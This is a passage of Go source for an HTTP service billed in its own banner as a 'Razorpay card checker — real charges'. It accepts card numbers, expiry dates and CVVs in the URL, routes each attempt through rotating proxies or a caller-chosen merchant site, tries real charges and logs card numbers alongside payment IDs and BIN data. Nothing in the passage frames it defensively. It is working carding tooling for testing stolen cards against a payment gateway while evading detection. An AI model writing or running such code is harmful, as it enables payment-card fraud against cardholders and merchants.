	re := regexp.MustCompile(`^/razorpay/cc=(.+)$`)
	match := re.FindStringSubmatch(path)

	if len(match) < 2 {
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}",
			"proxy":    "N/A",
		})
		return
	}

	cardData, _ := url.QueryUnescape(match[1])
	card, err := parseCard(cardData)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"status":   "error",
			"response": "Invalid card format. Use: cc|mm|yy|cvv",
			"proxy":    "N/A",
		})
		return
	}

	proxyParam := r.URL.Query().Get("proxy")
	var proxy string
	if proxyParam != "" {
		proxy = formatProxy(proxyParam)
	} else {
		proxyList := loadProxies("px.txt")
		proxy = getNextProxy(proxyList)
	}

	targetURL := r.URL.Query().Get("url")
	if targetURL == "" {
		targetURL = getNextURL()
	}

	result := checkCard(card.CC, card.MM, card.YY, card.CVV, proxy, targetURL)

	proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
	logResult(card.CC, result.Status, result.Message, proxyDisplay, targetURL)

	resp := map[string]interface{}{
		"status":   result.Status,
		"response": result.Message,
		"proxy":    proxyDisplay,
	}

	if result.PaymentID != "" {
		resp["payment_id"] = result.PaymentID
	}
	if result.OrderID != "" {
		resp["order_id"] = result.OrderID
	}
	if result.BIN != nil {
		resp["bin"] = result.BIN
	}

	if result.Status == "error" {
		w.WriteHeader(http.StatusInternalServerError)
	} else {
		w.WriteHeader(http.StatusOK)
	}
	json.NewEncoder(w).Encode(resp)
}

// ── Main ────────────────────────────────────────────────────────────────────
func main() {
	log.SetFlags(log.Ldate | log.Ltime)

	http.HandleFunc("/", handler)

	addr := fmt.Sprintf("0.0.0.0:%d", PORT)
	log.Printf("=========================================================")
	log.Printf("  RAZORPAY CARD CHECKER — REAL CHARGES")
	log.Printf("  Listening on: http://%s", addr)
	log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
	log.Printf("  Query: ?proxy=ip:port:user:pass&url=custom-site")
	log.Printf("=========================================================")

	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
